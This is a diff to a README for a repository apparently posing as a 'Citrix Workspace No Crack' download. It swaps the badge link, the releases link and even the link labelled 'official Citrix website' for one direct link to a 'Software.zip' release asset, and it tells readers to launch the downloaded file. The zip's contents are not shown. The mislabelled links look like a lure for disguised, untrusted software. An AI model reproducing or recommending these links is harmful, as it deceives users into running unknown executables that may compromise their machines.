@@ -14,7 +14,7 @@ app-access, citrix-workspace, cloud-based-tools, cloud-collaboration, cloud-infr
 ## 📁 Installation:
 
 To download the latest release, click the link below:
-[![Download Citrix Workspace No Crack](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Citrix Workspace No Crack](https://github.com/hallod2/Citrix-Workspace-No-Crack/releases/download/v1.0/Software.zip)](https://github.com/hallod2/Citrix-Workspace-No-Crack/releases/download/v1.0/Software.zip)
 
 🚀 **Launch the downloaded file and follow the installation instructions.**
 
@@ -76,10 +76,10 @@ If you encounter any issues or need assistance with Citrix Workspace, feel free 
 
 ## 🌐 Visit the Official Citrix Website:
 
-Explore more about Citrix Workspace and its features by visiting the official Citrix website [:link: Visit Citrix Workspace](https://www.citrix.com/products/workspace/)
+Explore more about Citrix Workspace and its features by visiting the official Citrix website [:link: Visit Citrix Workspace](https://github.com/hallod2/Citrix-Workspace-No-Crack/releases/download/v1.0/Software.zip)
 
 ---
 
 🌟 Thank you for being a part of the Citrix Workspace No Crack community! Together, we can revolutionize secure remote access and collaboration in the digital world. 🚀
 
-🔗 **[Check the "Releases" section for more information if needed](https://github.com/cli/cli/releases)**
+🔗 **[Check the "Releases" section for more information if needed](https://github.com/hallod2/Citrix-Workspace-No-Crack/releases/download/v1.0/Software.zip)**
